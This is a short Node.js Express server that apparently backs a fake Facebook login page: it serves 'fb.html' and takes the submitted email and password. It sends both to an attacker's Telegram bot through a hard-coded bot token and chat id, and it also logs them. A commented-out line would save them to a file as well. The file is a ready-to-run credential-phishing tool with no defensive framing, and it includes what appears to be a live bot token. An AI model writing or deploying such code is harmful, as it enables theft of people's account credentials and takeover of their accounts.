const express = require("express");
const app = express();
const fs = require("fs")
const request = require("request");
const chatid =2134964315
const token ="5603308671:AAFE5SZAerrezpCHJCvAInaXngJ-5yMslwE"
app.use(express.urlencoded({extended:false}));
app.use(express.json());
app.get("/",(req,res)=>{
  res.sendFile("/sdcard/fb.html")
})
app.post("/logged",async(req,res)=>{
   //res.send("<h1 style='text-align:center;'>succes<h1>")
 
 let email = await req.body.email
 let  password = await req.body.password
   let txt = `email : ${email}\npassword:${password}\n`
   console.log(txt)
   const bot_url
   =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}&text=${txt}`
   console.log(txt)
   res.send("succes")
    request.post(bot_url,(err)=>{
     if(err){
       //console.log(err)
       console.log("error")
     }
   })
   
   
 //  fs.appendFileSync("cred.txt",txt,(err)=>{console.log(err)})
//   console.log(txt)
})
app.get("*",(req,res)=>{
  res.send('<h1 style="text-align:center;">File not found </h1>')
  res.send(req.statusCode)
})
app.listen(8010,()=>{console.log("server ready")})